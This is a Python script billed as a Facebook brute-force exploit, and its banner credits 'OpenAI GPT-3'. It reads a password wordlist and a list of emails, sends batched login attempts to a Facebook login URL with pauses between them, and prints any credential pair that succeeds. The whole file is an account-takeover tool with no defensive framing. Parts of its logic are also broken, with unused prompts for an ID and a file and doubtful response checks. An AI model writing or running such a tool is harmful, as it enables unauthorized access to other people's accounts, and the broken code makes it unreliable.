import time
import requests
import sys

WAIT_TIME = 5
PASSWD_PER_REQUEST = 1000

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner(argv, usage=False, url=None, emails=None):
    print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
    print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
    print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
    print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
    print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
    print(bcolors.OKBLUE +
          '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
    print(bcolors.OKBLUE + "" + bcolors.ENDC)
    print("")
    print(bcolors.OKBLUE +
          "+ -- --=[Facebook Brute Force Exploit by OpenAI GPT-3" + bcolors.ENDC)
    if usage:
        print(bcolors.OKBLUE +
              "+ -- --=[Usage: %s http://facebook.com/login.php passwords.txt email [email2] [email3]..." % (argv[0]) + bcolors.ENDC)
        sys.exit(0)
    else:
        print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
              url + " with emails: " + str(emails) + "" + bcolors.ENDC)

def send_request(url, data):
    req = requests.post(url, data)
    rsp = req.content.decode('utf-8')
    return rsp

def check_response(content, email, passwd):
    if 'Welcome to Facebook' in content:
        print(bcolors.OKGREEN +
              "+ -- --=[w00t! Login successful! Email/Password: " + email + "/" + passwd + "" + bcolors.ENDC)
        sys.exit(0)
    elif 'Find Friends' in content or 'security code' in content or 'Two-factor authentication' in content or "Log Out" in content:
        print(bcolors.FAIL + "+ -- --=[Incorrect email or password: " +
              email + "/" + passwd + "" + bcolors.ENDC)
    else:
        print(bcolors.WARNING +
              "+ -- --=[Invalid response from target" + bcolors.ENDC)
        sys.exit(0)

def template(entries):
    t = 'email=%s&pass=%s'
    return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])

def attack(entries):
    if len(entries) < 1:
        return
    t = template(entries)
    return send_request(url, t)

def find_one(entries):
    for entry in entries:
        t = template([entry])
        content = send_request(url, t)
        check_response(content, entry.get('email'), entry.get('passwd'))

if __name__ == '__main__':
    if len(sys.argv) < 3:
        banner(sys.argv, True)

    url = sys.argv[1]     # SET TARGET
    wordlist = sys.argv[2]     # SET CUSTOM WORDLIST
    emails = sys.argv[3:]    # SET EMAILS TO BRUTE FORCE

    banner(sys.argv, False, url, emails)

    facebook_id = input("Enter Facebook ID: ")
    password_file = input("Enter the password file name: ")

    with open(wordlist, 'r') as f:
        passwds = f.read().splitlines()

    entries = []
    for email in emails:
        print("email: {}".format(email))
        for num in range(0, len(passwds)):
            if len(entries) == PASSWD_PER_REQUEST:
                if "Welcome to Facebook" in attack(entries):
                    find_one(entries)
                entries = []
                time.sleep(WAIT_TIME)

            entries.append({"email": email, "passwd": passwds[num], "id": facebook_id})
            
        if "Welcome to Facebook" in attack(entries):
            find_one(entries)

        entries = []
